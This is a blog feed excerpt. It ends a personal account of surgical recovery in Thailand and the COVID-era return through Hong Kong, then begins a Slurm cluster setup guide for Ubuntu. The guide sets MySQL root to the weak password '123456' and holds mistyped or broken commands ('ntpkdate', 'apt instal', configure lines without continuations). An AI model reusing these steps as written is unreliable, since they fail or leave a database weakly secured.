&lt;h2 id="seven">Seven&lt;/h2>
&lt;p>第十天，是拔尿管的好日子，这也算是术后恢复的最后一道门槛了。&lt;/p>
&lt;p>依旧是惯例提前叮嘱记得吃止痛药。然后就是在拔之前的一些其他的注意事项，拔掉之后要多喝水，如果拔完后几个小时内都尿不出来就得立刻联系护士，然后护士会回来给你插回去（防止尿道潴留）......&lt;/p>
&lt;p>拔的时候感觉确实很奇妙&lt;del>感觉要是多来几次会觉醒什么不得了的play&lt;/del>，在事后我也很顺利的尿出来了，避免了被二次尿道play。&lt;/p>
&lt;p>当然其实还有一道坎是拉屎来着。毕竟自术前三天开始就没什么固体食物摄入了，后续在恢复正常饮食之后极有可能便秘。而且在术后恢复期内对于拉屎也有额外叮嘱，如果遇到便秘的情况千万不能用力，防止伤口因为用力撕裂。也就是哪怕拉不出来 不拉也不要勉强自己。实在拉不出来可以问护士要泻药。当然于我个人而言还算顺利。&lt;/p>
&lt;p>闲暇之余找大学同学的妈妈算了个命，大学同学的妈妈在他们那边还算是半仙来着？其实是在考虑重新换个名字如果后面改身份证啥的。当然其实直到在写这篇文的时候我也依旧没有改身份证，因为需要出柜需要和家里人撕逼，迄今为止还是个地下党。当然这与我个人而言其实还好，毕竟现实生活里没有多少需要掏身份证的场景，同时已经女性化生活这么多年了。当然修改身份证会是这场旅途的最后一块拼图，希望以一天这块拼图可以被补上吧。&lt;/p>
&lt;p>好了扯远了回到算命的部分，阿姨莫名还是很友善的，很理解我的经历和遭遇，当然我也没说过我的什么经历，算出来的？甚至说如果又需要后面回国可以去她家里修养。算命说法是我是一个非常心善的孩子，对待朋友非常好，但对父母倔起来很可能六亲不认。Oops,某种程度上算是很准了。同时说我是菩萨命，男身女相，可惜投错胎如果是个女孩应该会生活很幸福。hhh,或许吧。&lt;/p>
&lt;p>在拔完尿管后遇到的另一个问题则是，你得重新学习熟悉尿尿的感觉，像一个幼儿园小朋友一样。学习尿尿的力道，坐姿，腿叉开多少才能保证不尿一屁股。当然这个还是和下体还没有消肿有关系。&lt;/p>
&lt;h2 id="eight">Eight&lt;/h2>
&lt;p>直到十九点，终于是有精力能够出门活动了。跑到了附近的商圈去吃寿喜烧巴拉巴拉的，肉肉！肉肉赛高！多吃肉肉才能更好的恢复 ，所以点了很多肉肉。通行的还有认识的另外一位姐妹。她和我不是一个医院的，但是跑来我们这边玩，趣味相投也就更多一起玩了。
&lt;img src="image-13.png" alt="Alt text">&lt;/p>
&lt;p>在泰国有非常多的日料，其实相较于太过本土料理以及泰国的中餐而言，我更喜欢太过等等日料。泰国料理的特色是会加很多国内不太常见的香料，以至于味道会很奇怪，喜欢的人可能会很喜欢。置于太过的中餐，其实主要以港餐以及川菜为主。港餐有诸如煲仔饭海南鸡饭一类的其实不错，川菜的话，恢复期辣的还是少吃把，毕竟不想另一个洞也痛起来。&lt;/p>
&lt;p>到了第二十八天，这之中除了每日按时通模具就是和各位其他姐妹约饭啊逛街一类的，也算是把泰国曼谷中心的商圈都跑了一遍。术后一个约左右是复诊的时间，如果复诊后没有什么异常的话理论上就可以回国了，当然要是有兴趣签证时间足够还可以多住几天。说起来落地签证中间需要办理一次续签，不过这个事情中介也会帮忙包办，只需要将护照交给中介即可。当然实质上交出护照是一个非常危险的举动，因为护照是你在国外的身份证，没有护照很可能寸步难行。&lt;/p>
&lt;p>复诊当天还是那个司机会把你接到医院（对他又迟到了）。再次见到了主导医生，会询问一下基础情况，然后会被带到检查室。&lt;del>在这里人生第一次体验了妇科检查椅子，以及阴道扩张器&lt;/del>&lt;/p>
&lt;p>在躺上椅子后医生会把两腿放在两边支架上，随后会使用扩张器查看一下内部恢复情况。我选择的这位医生是出了名的会长肉芽。&lt;/p>
&lt;blockquote>
&lt;p>肉芽: 顾名思义，是人体在身体内部出现空腔损伤后身体自发修复过程中长出的小肉块。&lt;/p>
&lt;/blockquote>
&lt;p>如果有肉芽一般会使用电刀帮你切掉（不打麻药的...）当然如果你实在觉得痛可以在给你打麻药，但是好像要另外加钱。除了这些流程之外还会测试阴蒂的敏感程度。~~啊，几乎就是用棒子给电了以下，下意识的就叫出来了！！！~~此外后还会拍照，照片可能会作为后面医院自己宣传使用吧，当然你也以要一份。&lt;/p>
&lt;p>我个人情况是恢复的ok,也没有肉芽（说是没有但是检查的时候还是感觉医生用了电刀切了什么，因为闻到了烤肉的味道？）&lt;/p>
&lt;p>到第三十二天护士来把外部的缝合线拆了拆，接下来也就会踏上回国旅途了。当然其实很多线材都是可吸收线，但是因为恢复的很好可吸收线反而成了愈合的阻碍（身体感知到可吸收线这个异物的存在会在缝合处发炎）&lt;/p>
&lt;p>到了回国的部分，又是喜闻乐见的大健康时代的特色事件了。其实在泰国同样的时间除了住院的时候做了一次核酸已经很少能感知到疫情的存在了，商场里人流涌动，街头车水马龙。也没有人戴口罩，也没有大白，就像过往许许多多平常人日子一样，每个人安居乐业。当然我不属于这里，于是大健康时代的东西还是一样都逃不掉。&lt;/p>
&lt;h2 id="nine---return">Nine - Return&lt;/h2>
&lt;p>当时我自己的安排是泰国直飞香港，然后从香港走陆路从深圳入境。这之中的主要考量也就是成本了。自费隔离是逃不掉的，主要问题是机票钱。泰国直飞国内的机票价格当时被炒上天，走香港入境深圳算上隔离的钱还比不上这一张机票。其实到这里这场旅途就算是到达尾声了。不过因为受了之前干妈的照顾，而干妈的女儿想在泰国多玩会，因为干妈英语一般，于是我得担起把干妈送到机场的工作。而干妈是直飞国内的，所以相较于我飞香港还有很多额外的步骤。其中就是起飞前的多次核酸。&lt;/p>
&lt;p>与飞香港只需要在上飞机前用核酸试纸自测并将结果展示给值机柜台不同，飞国内必须在航空公司指定的核酸检测机构做满多次核算并且结果无异常后才可以登机。当然这个指定机构的核算自然是要掏钱的，而且非常贵几次核算就要上千元。要带干妈去机场的我自然也要帮忙处理这些。&lt;/p>
&lt;p>打车到专门的核算点之后就可以看到那些在墙里面常见的特色汉服了，同时核算点内的工作人员操着熟悉的中文在那卖力吆喝，所有人必须戴面罩口罩间隔一米核酸检测。当然在所有小唐人穿着汉服排队核算的时候我在一旁口罩也不带的看热闹，也挺有意思。上飞机当日，国内直飞航班也是需要穿着全套的隔离服带口罩面罩才能登机。在熙来攘往的素万那普国际机场形形色色的外国游人中，老中们组成了一道靓丽的风景线属实是。
&lt;img src="image-14.png" alt="Alt text">&lt;/p>
&lt;p>送完阿姨之后在机场，我接上和我同行回国的小姐妹后，两人一起做完自测核酸试纸就准备登机了。这之中还有个插曲，理论上手术后身体不适合长期步行是可以申请机场轮椅服务的，当然服务需要出具医疗证明。这个证明在出院的时候院方就给出了，但是到我在机场尝试申请轮椅服务时泰航的工作人员却告诉我需要十五日内的证明。然而手术已经是一个前的事情了？！于是无奈又打电话给中介让中介麻烦医院重新给一份电子的证明。但是这个情况之后泰国航空遇到了，在其他航空公司哪怕是国内航司都是只需要口头申请或者电话确认就可以安排，甚至连证明都不需要看。&lt;/p>
&lt;p>有了轮椅服务之后会有工作人员一路推着到登机口上飞机，而且飞机上的普通经济舱也会帮忙免费升舱到舒适经济舱，同时优先登机免于排队。当然这两位泰航的工作人员还示意要了小费。&lt;/p>
&lt;blockquote>
&lt;p>其实之前忘记提了，泰国也是一个有小费文化的国家，当然没有美国那么过分。我个人对于小费的态度是入乡随俗，毕竟多数服务人员真的很辛苦。某个暴雨的夜晚在酒店不小心打碎了可乐瓶（酒店送的可乐是玻璃瓶装的，顺便忘记说了我住的酒店房间是可以赤脚进入的，我一般也会选择赤脚），打电话给酒店前台后一位阿姨披着雨披跑来很细致的清理干净了，于是给了挺多的小费，当然本来这个额外的房间清理服务是免费的。&lt;/p>
&lt;/blockquote>
&lt;h2 id="ten---hongkong">Ten - Hongkong&lt;/h2>
&lt;p>抵达香港之后同样是会有航司的工作人员带着轮椅在下机口等待。然后一路推着来到香港入境处，临时入境的中国人可以在香港待的时间是有限制的。在入境香港后的入境深圳是需要抽签的，然后我和同行的小姐妹分别抽中了不同的批次，所以我在 送走她之后还可以在香港自己玩两天。&lt;/p>
&lt;p>在香港的几天一个人玩的很自在，其实在后期我恢复的已经很不错了，相较于同行走几步就不行的小姐妹我基本可以在外头走一天。不过可惜的是没有去香港的本岛，更多的是在九龙一块区域玩，和香港本岛隔海相望。&lt;/p>
&lt;p>九龙这块很多地方就很像九十年代港片里的香港一样，复古的红色出租车，高大拥挤的筒子楼鸽子楼以及琳琅满目灯红酒绿的港式招牌铺满整个大街，可以说港味很浓。当然香港的消费确实很高，虽然港币对人民币是1.1：1,但是10平米都勉强的房间要价700，一顿普通的盒饭基本要40,日常下个街边苍蝇馆子可能也要几百快，有点感叹穷人活不起了。不过从便利店打出的招聘来说店员的月薪都来到了1w8接近2w港币的月薪。&lt;/p>
&lt;p>越是靠近维多利亚湾的部分越是繁华，维多利亚湾边上是巨大的K11商场，可以说国内装修上能够望其项背的也就南京德基的那个号称豪华厕所，但是也只是为望其项背而已。
&lt;img src="image-15.png" alt="Alt text">
&lt;img src="image-16.png" alt="Alt text">&lt;/p>
&lt;p>维多利亚湾可以说是印象最深刻的部分，同样是以灯光秀著名的港湾例如上海南京路黄浦江这样的国内景点，维多利亚湾给人的感受就会舒适很多。而不像国内那种人声鼎沸人挤人的状态。当然也有可能是因为我去的时候是疫情期间旅游淡季的缘故？&lt;/p>
&lt;p>湾边三三两两的行人，路灯杆上的广播中放着舒缓的音乐，吹着迎面而来的海风，这才会真切感受到游玩的乐趣。而不是像南京路一样，放眼望去都是人，被人推着走过一边游客就算来过的氛围。在一旁的星巴克点一杯咖啡，看着一边的景色，非常惬意。
&lt;img src="image-18.png" alt="Alt text">&lt;/p>
&lt;p>维多利亚港旁边就是闻名的香港星光大道，在这里可以看到很多港台明星留下的手模，当然还有算得上是香港吉祥物的麦兜。
&lt;img src="image-19.png" alt="Alt text">
&lt;img src="image-17.png" alt="Alt text">&lt;/p>
&lt;p>到了晚间特定的时间点会有灯光秀。如果有兴趣的朋友可以提前确认好时间去等着，似乎有两场。我是跑到岸边逛街才知道晚上会有等灯光秀。夜晚的维多利亚才是更符合记忆内香港的感觉。
&lt;img src="image-20.png" alt="Alt text">&lt;/p>
&lt;p>当然在香港入境前还需要每日做核酸检测，当然香港的核酸点其实也多数是为了大陆人服务。香港人自己基本不太做核算了。而且讲道理我们入境之后必须采取自我隔离的态度，不允许去什么公共店铺吃饭之类的，但是依稀记得有个餐馆的老板的态度是去他妈的核酸。&lt;/p>
&lt;p>一些有关香港有意思的事情，在九龙有很多歌舞厅，这一点香港给人一种还在上个世纪的恍如隔世的感觉，门口招牌上也是宛如上世纪的风格。搭配上复古的灯牌，老香港的味道。同时还有一些有意思的店是会有簧片专卖店？当然没有进去过，似乎是书籍和CD都会卖。甚至路边还会有摆摊卖小玩具的，提到小玩具其实还要说一嘴：&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>在泰国色情玩具和赌博是违法的，如果携带玩具或者是纸牌一类的入境可能要注意？&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="image-21.png" alt="Alt text">&lt;/p>
&lt;p>目前为止，是我旅途最后一段在墙外了，说实话还是比较珍惜这段时光的。世界真的很大，应该多去看看。&lt;/p>
&lt;h2 id="eleven---back-to-wall">Eleven - Back to wall&lt;/h2>
&lt;p>入境深圳那天，我是坐公交车到尽量接近深圳的位置，香港的郊区，然后打车到深圳口岸。这里吐槽香港的计程车是真的非常贵，十几公里的路程花了一百多元的。当然这主要是因为没有任何公共交通可以入境大陆了。&lt;/p>
&lt;p>到了深圳口岸就得步行到入境点了，除了常规入境需要的安全检查之外还有大奖抗时代专属的核酸检测等等。在待遇上感觉自己从国外回来就感觉是被当成了“汉江怪物”&lt;/p>
&lt;p>&lt;img src="image-22.png" alt="Alt text">&lt;/p>
&lt;p>在实时核算结果出来之后就会按照接下来的去向被送去不同的隔离酒店。在隔离酒店住满xx天后才可以“刑满释放”，不过即使是“刑满释放”也不允许随意走动，比如自己跑去坐什么公共交通之类的。如果准备接下来前往广东境内只能是有亲属来接，或者自己打车前往接收目的地，且目的地居委会等管理机构声明接收才可以，不然的话就只能被去深圳机场，或者继续隔离。所以其实后续讲道理我应该回到广东，但是因为这个傻逼政策的缘故只能先跑上海投奔别人（能来机场接我），待满多少天等境外行程码消掉之后才能回到广东。&lt;/p>
&lt;p>所以这场旅行终于算是告于段落，回到自己的小出租屋后我有干嘛呢？被二号模具捅到自闭，然后继续躺尸，然后找了个工作，然后离开了广东去新的工作，然后被新工作派去鸟不拉屎的山区出差，然后气愤离职，然后再度入职，直到现在...&lt;/p>
&lt;p>所以&lt;/p>
&lt;p>Trans之外，人还要生活，还要工作，学会生活，学会自力更生，生活不止Trans.世界很大，多去看看。&lt;/p></description><category domain="https://yuukisama.cc/categories/life/">LIFE</category><category domain="https://yuukisama.cc/tags/srs/">SRS</category><category domain="https://yuukisama.cc/tags/lgbtq-/">LGBTQ+</category></item><item><title>记一次Slurm集群部署</title><link>https://yuukisama.cc/posts/code/%E8%AE%B0%E4%B8%80%E6%AC%A1slurm%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/%E8%AE%B0%E4%B8%80%E6%AC%A1slurm%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/</guid><pubDate>Thu, 13 Jul 2023 00:52:36 +0800</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h1 id="记一次slurm集群环境部署">记一次Slurm集群环境部署&lt;/h1>
&lt;p>工作中遇到了好几次基于Slurm部署HPC计算集群的工作。因此在这里记录一下部署过程。&lt;/p>
&lt;p>不过由于集群部署的复杂性，以及这是一篇事后的复盘文章，所以可能有所纰漏，还望指正。&lt;/p>
&lt;h2 id="hpcslurm">HPC——Slurm&lt;/h2>
&lt;p>有关HPC和slurm的相关介绍就不在此赘述了，贴一下相关简介链接，有兴趣的可以去看一下。&lt;/p>
&lt;ol>
&lt;li>&lt;a href="https://zhuanlan.zhihu.com/p/84337096">HPC&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://zhuanlan.zhihu.com/p/571973164">Slurm&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="环境介绍">环境介绍&lt;/h2>
&lt;ol>
&lt;li>本次所有设备均使用ubuntu系统，四台服务器，其中一台作为主节点的同时作为计算节点，另外三台作为从节点（计算节点）&lt;/li>
&lt;li>部署slurm软件版本为23.02&lt;/li>
&lt;li>集群使用nfs作为统一存储服务&lt;/li>
&lt;li>使用Mysql作为slurm服务的存储数据库&lt;/li>
&lt;/ol>
&lt;h2 id="部署准备">部署准备&lt;/h2>
&lt;h3 id="gpu等相关配套软件调试">GPU等相关配套软件调试&lt;/h3>
&lt;p>由于本集群将多数用于人工智能深度学习相关领域，因而会使用到GPU计算。这里后面会贴一个链接详细讲述GPU配置。&lt;/p>
&lt;pre tabindex="0">&lt;code>TODO
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>NVIDIA 驱动安装&lt;/li>
&lt;li>CUDA Toolkit 安装&lt;/li>
&lt;li>NVCC 安装&lt;/li>
&lt;li>MPI并行计算驱动安装&lt;/li>
&lt;/ol>
&lt;h2 id="slurm部署">Slurm部署&lt;/h2>
&lt;h3 id="时间同步">时间同步&lt;/h3>
&lt;p>集群部署工作中必定有一个问题是要确保集群内所有设备节点时间一致性，保证服务器时间，时区准确。此处以ubuntu中的操作为例子（后续所有操作例子均为在ubuntu22.04 LTS版本下）&lt;/p>
&lt;ol>
&lt;li>在所有服务器上安装ntpdate服务&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo apt-get install ntpdate
&lt;/code>&lt;/pre>&lt;ol start="2">
&lt;li>时间校准&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo ntpkdate cn.pool.ntp.org
&lt;/code>&lt;/pre>&lt;ol start="3">
&lt;li>更新硬件时间&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo hwclock --systohc
&lt;/code>&lt;/pre>&lt;h3 id="创建集群所需用户">创建集群所需用户&lt;/h3>
&lt;p>集群需要用到以下linux账户，因此需要提前创建。&lt;/p>
&lt;p>&lt;strong>注意： 不仅仅是用户名和用户组名的一致性，所有集群服务器上的所使用到的用户必须保证用户名，用户ID,组名，组ID一致&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>munge 集群验证模块&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo groupadd -g 1888 munge
sudo useradd -r -u 1888 -g 1888 -s /usr/sbin/nologin munge
&lt;/code>&lt;/pre>&lt;ol start="2">
&lt;li>slurm 部分slurm软件运行所需要的账户&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo groupadd -g 1000 slurm
sudo useradd -r -u 1000 -g 1000 -s /usr/sbin/nologin slurm
&lt;/code>&lt;/pre>&lt;p>用户id或者用户名可自定义，确保集群内所有服务器上的一致即可。&lt;/p>
&lt;h3 id="mysql安装">Mysql安装&lt;/h3>
&lt;p>Slurm集群任务记录，账户记录等可以通过数据库存储记录，方便用户查看管理（当然数据库并不是必须的组件，slurm可以不使用数据库进行部署，即不选择安装slurmdbd）&lt;/p>
&lt;ol>
&lt;li>使用ubuntu软件源中的mysql安装&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo apt instal mysql-server
&lt;/code>&lt;/pre>&lt;ol start="2">
&lt;li>启动mysql服务&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo systemctl start mysql #启动mysql.service
sudo systemctl enable mysql#设置mysql.service开机自启
&lt;/code>&lt;/pre>&lt;ol start="3">
&lt;li>配置mysql数据库账户密码&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>ALTER USER &amp;#39;root&amp;#39;@&amp;#39;localhost&amp;#39; IDENTIFIED BY &amp;#39;123456&amp;#39; # 配置数据库用户密码
&lt;/code>&lt;/pre>&lt;p>简单一点可以直接使用root用户，当然如果出于安全考虑，可以使用专用的mysql用户密码，或者使用docker部署mysql服务，确保环境隔离。&lt;/p>
&lt;ol start="4">
&lt;li>配置mysql数据库
配置mysql参数确保slurmdbd服务不会出现&lt;code>error: Database settings not recommended values: innodb_buffer_pool_size innodb_lock_wait_timeout&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>编辑/etc/my.cnf&lt;/p>
&lt;pre tabindex="0">&lt;code>[mysqld]
innodb_buffer_pool_size=1024M
innodb_log_file_size=64M
innodb_lock_wait_timeout=900
&lt;/code>&lt;/pre>&lt;ol start="5">
&lt;li>重启mysql服务&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo systemctl restart mysql
&lt;/code>&lt;/pre>&lt;h3 id="munge-服务安装">Munge 服务安装&lt;/h3>
&lt;p>munge，slurm的相关组建等软件在ubuntu的软件源中有，但是存在一些版本问题（例如在ubuntu22中slurm的版本就比较落后），所以本文多数使用源码部署的方式。&lt;/p>
&lt;ol>
&lt;li>安装ubuntu编译工具&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo apt instal build-essential -y
&lt;/code>&lt;/pre>&lt;ol start="2">
&lt;li>安装munge依赖&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo apt install openssl bzip2 pkgconf libssl-dev -y
&lt;/code>&lt;/pre>&lt;ol start="3">
&lt;li>下载munge源码包&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>git clone https://github.com/dun/munge &amp;amp;&amp;amp; cd munge
&lt;/code>&lt;/pre>&lt;ol start="4">
&lt;li>编译安装munge
这里需要注意的是使用官方渠道下载的源码压缩包，和直接git clone的源码包在编译安装上是有步骤差异的。git clone的版本而需要使用bootstrap生产configure。&lt;/li>
&lt;/ol>
&lt;p>本文使用git clone版本的源码为例子。如果是官方渠道下载的源码压缩包可以跳过接下来的一步。&lt;/p>
&lt;ol start="5">
&lt;li>生成configure
安装bootstrap所需依赖&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo apt install autoconf automake libtool -y
&lt;/code>&lt;/pre>&lt;p>执行bootstrap&lt;/p>
&lt;pre tabindex="0">&lt;code>./bootstrap
&lt;/code>&lt;/pre>&lt;p>如果是直接下载的官方源码包可以跳过本步骤直接到configure配置部分.&lt;/p>
&lt;ol start="6">
&lt;li>configure安装参数&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>./configure \
--prefix=/usr \
--sysconfdir=/etc \
--localstatedir=/var \
--runstatedir=/run
&lt;/code>&lt;/pre>&lt;ol start="7">
&lt;li>执行安装&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>make
make check
sudo make install
&lt;/code>&lt;/pre>&lt;ol start="8">
&lt;li>启动munge服务&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>sudo systemctl start munge
sudo systemctl enable munge
sudo systemctl status munge
&lt;/code>&lt;/pre>&lt;ol start="9">
&lt;li>修改目录权限
修改权限为munge管理。munge:munge (如果是使用软件源安装的munge用户会自动创建,但是提前手动创建可以确保munge用户id以及组id一致性）&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>chown -R munge: /etc/munge/
chmod 400 /etc/munge/munge.key
chown -R munge: /var/lib/munge
chown -R munge: /var/run/munge # 可能不存在
chown -R munge: /var/log/munge
&lt;/code>&lt;/pre>&lt;ol start="10">
&lt;li>生成munge key&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>/usr/sbin/mungekey -f # -f 参数 用于覆盖默认生成的key
&lt;/code>&lt;/pre>&lt;ol start="11">
&lt;li>测试是否成功运行&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>$ munge -n | unmunge | grep STATUS
STATUS: Success (0)
&lt;/code>&lt;/pre>&lt;ol start="12">
&lt;li>&lt;strong>在集群其他机器上部署munge服务&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>无比确保所有集群节点服务器上的linux munge用户存在，且uid,gid一致，munge服务存在，且所有的/etc/munge/munge.key文件为同一个（需要将主节点的munge.key复制到其他从节点上）且文件权限正确&lt;/strong>&lt;/p>
&lt;h3 id="配置hosts文件">配置hosts文件&lt;/h3>
&lt;ol>
&lt;li>在所有slurm集群的服务器的/etc/hosts文件中添加主机名与IP的映射.&lt;/li>
&lt;/ol>
&lt;p>例如在本文的例子中，将用到一个主节点以及三个从节点，分别以master,work1,work2,work3命名，都在192.168.1.1/24网段下，因此hosts文件中的内容大致如下:&lt;/p>
&lt;pre tabindex="0">&lt;code>192.168.1.2 master
192.168.1.3 work1
192.168.1.4 work2
192.168.1.5 work3
&lt;/code>&lt;/pre>&lt;ol start="2">
&lt;li>配置hostname
配置完hosts文件后需要将对应节点是hostname也修改为对应的名字，例如master节点的/etc/hostname文件&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>master
&lt;/code>&lt;/pre>&lt;p>work1节点/etc/hostname&lt;/p>
&lt;pre tabindex="0">&lt;code>work1
&lt;/code>&lt;/pre>&lt;h3 id="slurm安装">Slurm安装&lt;/h3>
&lt;p>slurm服务分为如下几个组成部分，分别具有不同的作用。&lt;/p>
&lt;ol>
&lt;li>slurmd
基本slurm组件服务，负责slurm计算节点计算的守护节点，理论上所有的计算节点（或者说从节点）都需要运行该服务.&lt;/li>
&lt;li>slurmctld
slurm控制服务，是slurm主节点上所必须存在的服务，用户和其他所有从节点通讯并管理从节点。仅仅作为管理节点的主节点需要安装该服务。&lt;/li>
&lt;li>slurmdbd
用于和数据库沟通的服务。如果准备部署的slurm集群不考虑记录存储工作记录（即用不到到数据库功能可以缺省）&lt;/li>
&lt;li>slurmrestd
非必需服务，用于将slurm操作接口暴露为api供三方软件调用操作集群使用。如果搭建的集群不考虑配套三方GUI服务一类的可缺省&lt;/li>
&lt;/ol>
&lt;p>slurm中所罗列的几个服务其实可以都分别安装在不同的设备上，共同组成集群。不过一般情况下我们习惯性的将slurmctld,slurmdbd，slurmrestd，slurmd部署在主节点上（由于存在slurmd所以主节点也作为一个计算节点，从节点）。而其他从节点仅仅部署slurmd。&lt;/p>
&lt;p>同时前面说过，ubuntu软件源中虽然存在slurm,但是其软件版本不一定是需要的版本，不一定是最新版，因此使用源码编译的方式安装slurm.&lt;/p>
&lt;h4 id="下载slurm源码压缩包">下载slurm源码压缩包&lt;/h4>
&lt;pre tabindex="0">&lt;code>wget https://download.schedmd.com/slurm/slurm-23.02.3.tar.bz2
# 解压
tar --bzip -x -f slurm*tar.bz2
# 进入源码目录
cd slurm*
&lt;/code>&lt;/pre>&lt;h4 id="configure安装配置">configure安装配置&lt;/h4>
&lt;pre tabindex="0">&lt;code>./configure
--prefix=/usr
--sysconfdir=/etc
--localstatedir=/var
--runstatedir=/run
# 执行make
make
# 执行make check
make check
# 执行安装
sudo make install
&lt;/code>&lt;/pre>&lt;h4 id="生成slurm基础配置文件">生成slurm基础配置文件&lt;/h4>
&lt;p>slurm 官方提供了一个web工具用以生成web配置文件: &lt;a href="https://slurm.schedmd.com/configurator.html">https://slurm.schedmd.com/configurator.html&lt;/a>&lt;/p>
&lt;p>根据你的需要修改相关的配置参数，提交后将生成的配置文件内容复制到/etc/slurm/slurm.conf中，&lt;strong>同时该文件应该在每一个集群内的节点中都相同，不论是主节点还是从节点&lt;/strong>&lt;/p>
&lt;p>接下来会罗列几个重要的需要修改的参数，以及后续会提供所有参数其对应的作用.&lt;/p>
&lt;p>修改配置文件目录所有者权限&lt;/p>
&lt;pre tabindex="0">&lt;code>sudo chown -R slurm:slurm /etc/slurm
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># Cluster Name：集群名
ClusterName=Cluster # 集群名，任意英文和数字名字
# Control Machines：Slurmctld控制进程节点
SlurmctldHost=master # 启动slurmctld进程的节点名，如这里的master
BackupController= # 冗余备份节点，可空着
SlurmctldParameters=enable_configless # 采用无配置模式
# Slurm User：Slurm用户
SlurmUser=slurm # slurmctld启动时采用的用户名
# Slurm Port Numbers：Slurm服务通信端口
SlurmctldPort=6817 # Slurmctld服务端口，设为6817，如不设置，默认为6817号端口
SlurmdPort=6818 # Slurmd服务端口，设为6818，如不设置，默认为6818号端口
# State Preservation：状态保持
StateSaveLocation=/var/spool/slurmctld # 存储slurmctld服务状态的目录，如有备份控制节点，则需要所有SlurmctldHost节点都能共享读写该目录
SlurmdSpoolDir=/var/spool/slurmd # Slurmd服务所需要的目录，为各节点各自私有目录，不得多个slurmd节点共享
ReturnToService=1 #设定当DOWN（失去响应）状态节点如何恢复服务，默认为0。
# 0: 节点状态保持DOWN状态，只有当管理员明确使其恢复服务时才恢复
# 1: 仅当由于无响应而将DOWN节点设置为DOWN状态时，才可以当有效配置注册后使DOWN节点恢复服务。如节点由于任何其它原因（内存不足、意外重启等）被设置为DOWN，其状态将不会自动更改。当节点的内存、GRES、CPU计数等等于或大于slurm.conf中配置的值时，该节点才注册为有效配置。
# 2: 使用有效配置注册后，DOWN节点将可供使用。该节点可能因任何原因被设置为DOWN状态。当节点的内存、GRES、CPU计数等等于或大于slurm.conf 中配置的值，该节点才注册为有效配置。￼
# Default MPI Type：默认MPI类型
MPIDefault=None
# MPI-PMI2: 对支持PMI2的MPI实现
# MPI-PMIx: Exascale PMI实现
# None: 对于大多数其它MPI，建议设置
# Process Tracking：进程追踪，定义用于确定特定的作业所对应的进程的算法，它使用信号、杀死和记账与作业步相关联的进程
ProctrackType=proctrack/cgroup
# Cgroup: 采用Linux cgroup来生成作业容器并追踪进程，需要设定/etc/slurm/cgroup.conf文件
# Cray XC: 采用Cray XC专有进程追踪
# LinuxProc: 采用父进程IP记录，进程可以脱离Slurm控制
# Pgid: 采用Unix进程组ID(Process Group ID)，进程如改变了其进程组ID则可以脱离Slurm控制
# Scheduling：调度
# DefMemPerCPU=0 # 默认每颗CPU可用内存，以MB为单位，0为不限制。如果将单个处理器分配给作业（SelectType=select/cons_res 或 SelectType=select/cons_tres），通常会使用DefMemPerCPU
# MaxMemPerCPU=0 # 最大每颗CPU可用内存，以MB为单位，0为不限制。如果将单个处理器分配给作业（SelectType=select/cons_res 或 SelectType=select/cons_tres），通常会使用MaxMemPerCPU
# SchedulerTimeSlice=30 # 当GANG调度启用时的时间片长度，以秒为单位
SchedulerType=sched/backfill # 要使用的调度程序的类型。注意，slurmctld守护程序必须重新启动才能使调度程序类型的更改生效（重新配置正在运行的守护程序对此参数无效）。如果需要，可以使用scontrol命令手动更改作业优先级。可接受的类型为：
# sched/backfill # 用于回填调度模块以增加默认FIFO调度。如这样做不会延迟任何较高优先级作业的预期启动时间，则回填调度将启动较低优先级作业。回填调度的有效性取决于用户指定的作业时间限制，否则所有作业将具有相同的时间限制，并且回填是不可能的。注意上面SchedulerParameters选项的文档。这是默认配置
# sched/builtin # 按优先级顺序启动作业的FIFO调度程序。如队列中的任何作业无法调度，则不会调度该队列中优先级较低的作业。对于作业的一个例外是由于队列限制（如时间限制）或关闭/耗尽节点而无法运行。在这种情况下，可以启动较低优先级的作业，而不会影响较高优先级的作业。
# sched/hold # 如果 /etc/slurm.hold 文件存在，则暂停所有新提交的作业，否则使用内置的FIFO调度程序。
# Resource Selection：资源选择，定义作业资源（节点）选择算法
SelectType=select/cons_tres
# select/cons_tres: 单个的CPU核、内存、GPU及其它可追踪资源作为可消费资源（消费及分配），建议设置
# select/cons_res: 单个的CPU核和内存作为可消费资源
# select/cray_aries: 对于Cray系统
# select/linear: 基于主机的作为可消费资源，不管理单个CPU等的分配
